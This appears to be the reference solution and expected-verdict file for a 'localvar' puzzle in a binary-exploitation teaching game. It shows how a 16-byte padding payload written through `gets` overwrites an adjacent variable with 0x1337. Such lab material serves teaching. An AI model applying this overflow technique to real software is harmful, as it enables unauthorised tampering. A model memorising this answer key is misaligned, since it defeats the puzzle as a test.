# localvar reference solution

The local variable `access` starts at `0x7fffff10`; `buf` starts at `0x7fffff00`, so the offset is 16 bytes. The `gets(buf)` author block writes continuously from the buffer.

Write 16 padding bytes followed by the little-endian bytes for `0x1337`, `3713000000000000`. The program loads `[rbp+0x10]` into RAX and exits; the replay then wins. The payload uses literal bytes only and cannot directly name the access address.

```json
{
  "actions": [
    { "type": "block", "id": "gets", "args": { "data": "414141414141414141414141414141413713000000000000" } },
    { "type": "run" }
  ],
  "expectedVerdict": "won",
  "note": "16 padding bytes overwrite buf, then 0x1337 in little-endian order"
}
```
